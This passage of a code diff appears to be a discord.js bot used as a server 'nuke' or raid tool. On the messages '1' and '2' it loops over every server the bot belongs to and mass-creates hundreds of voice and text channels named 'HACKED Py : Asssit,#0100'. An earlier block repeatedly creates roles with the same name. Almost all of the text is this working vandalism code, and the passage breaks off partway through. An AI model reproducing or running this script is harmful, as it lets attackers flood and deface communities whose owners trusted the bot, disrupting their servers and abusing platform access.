+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "HACKED Py : Asssit,#0100",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    
+    
+    
+   
+})
+ 
+ 
+}
+});
+LOka.on('message', message => {
+         if (message.content === "2") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+ 
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+ 
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+ 
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+ 
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+ 
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+ 
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+ 
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+m.createChannel('HACKED Py : Asssit,#0100', 'text');
+ 
+})
+}
+});
+ 
+LOka.on('message', message => {
+         if (message.content === "1") {
+                 LOka.guilds.forEach(m =>{
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+ 
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+ 
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+ 
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+ 
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+ 
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice'); 
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
